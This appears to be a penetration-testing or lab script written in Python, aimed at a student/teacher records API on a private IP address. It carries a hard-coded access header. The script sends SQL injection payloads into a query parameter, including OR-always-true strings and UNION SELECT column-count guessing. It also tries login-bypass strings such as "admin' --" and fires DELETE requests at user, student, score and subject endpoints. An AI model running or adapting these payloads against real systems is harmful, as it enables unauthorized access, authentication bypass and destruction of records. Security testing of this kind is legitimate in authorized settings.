#!/usr/bin/env python3
import requests
import json

BASE_URL = "http://192.168.100.110:3333"
HEADERS = {"x-activate-code": "8d7a77ae-dac9-4397-afd6-44b92fd5b6f7"}


def test_sql_injection(param_name, injection_points):
    print(f"\n=== Testing SQLi on {param_name} ===")
    for payload in injection_points:
        params = {"user_type": "students", "fields": "user_id,name"}
        if param_name == "user_type":
            params["user_type"] = payload

        try:
            resp = requests.get(
                f"{BASE_URL}/api/v1/users", params=params, headers=HEADERS
            )
            print(f"Payload: {payload}")
            print(f"Status: {resp.status_code}")
            if resp.status_code == 200:
                print(f"Response: {resp.text[:200]}...")
            elif resp.status_code == 500:
                print("Server Error (Potential SQLi)")
        except Exception as e:
            print(f"Error: {e}")


# Payloads
sqli_payloads = [
    "'",
    "students'",
    "students' --",
    "students' OR '1'='1",
    "students' UNION SELECT 1,2,3,4,5 --",
    "students' UNION SELECT 1,2,3,4,5,6,7,8,9,10 --",  # Guessing column count
]

test_sql_injection("user_type", sqli_payloads)

# Login SQLi
print("\n=== Testing Login SQLi ===")
login_payloads = ["' OR '1'='1", "admin' --", "T001' #", "T001' OR 1=1 --"]

for payload in login_payloads:
    data = {"user_id": payload, "password": "any", "user_type": "teacher"}
    resp = requests.post(f"{BASE_URL}/api/v1/login", json=data, headers=HEADERS)
    print(f"User: {payload} -> {resp.status_code} - {resp.text}")

# Check DELETE
print("\n=== Testing DELETE method ===")
endpoints = [
    "/api/v1/users",
    "/api/v1/user",
    "/api/v1/student",
    "/api/v1/score",
    "/api/v1/subject",
]
for ep in endpoints:
    resp = requests.delete(f"{BASE_URL}{ep}", headers=HEADERS)
    if resp.status_code != 404 and resp.status_code != 405:  # 405 Method Not Allowed
        print(f"DELETE {ep}: {resp.status_code} - {resp.text}")
    else:
        # print(f"DELETE {ep}: {resp.status_code}")
        pass
